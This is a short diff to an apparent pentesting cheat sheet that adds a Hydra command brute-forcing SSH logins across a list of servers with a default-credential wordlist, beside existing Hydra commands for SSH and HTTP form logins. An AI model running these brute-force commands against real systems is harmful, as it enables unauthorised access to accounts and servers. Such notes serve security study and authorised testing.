@@ -409,6 +409,8 @@ Reference = https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-
 FOR SSH
 hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.101 -t 4 ssh
 
+hydra -C /usr/share/legion/wordlists/ssh-betterdefaultpasslist.txt -M ssh_servers.txt  -t 4 ssh
+
 FOR HTTP FORM
 hydra -L [user] -P [password] [IP] http-post-form "/:usernam=^USER^ & password=^PASS^:F=incorrect" -V
 ```
